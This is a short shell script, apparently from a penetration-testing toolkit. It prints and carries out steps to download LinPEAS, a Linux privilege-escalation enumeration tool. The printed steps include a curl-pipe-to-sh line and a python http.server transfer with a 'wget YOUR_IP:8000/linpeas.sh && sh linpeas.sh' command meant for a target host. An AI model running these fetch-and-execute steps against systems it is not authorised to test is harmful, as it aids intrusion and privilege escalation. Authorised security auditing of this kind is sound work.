#!/bin/sh
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/../common-script.sh"

echo ""
info "=== LinPEAS (Privilege Escalation) ==="
info "Downloads and runs the latest LinPEAS script."
info "Detects: SUID binaries, writable files, creds, CVEs, and more."
echo ""
info "Download & run:"
echo "  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
echo ""
info "Or save and transfer to target:"
echo "  curl -LO https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
echo "  chmod +x linpeas.sh"
echo "  python3 -m http.server 8000  # serve it"
echo "  # on target: wget YOUR_IP:8000/linpeas.sh && sh linpeas.sh"
echo ""
if command -v curl >/dev/null 2>&1; then
    curl -L "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" -o /tmp/linpeas.sh 2>&1
    chmod +x /tmp/linpeas.sh
    info "Downloaded to /tmp/linpeas.sh"
fi
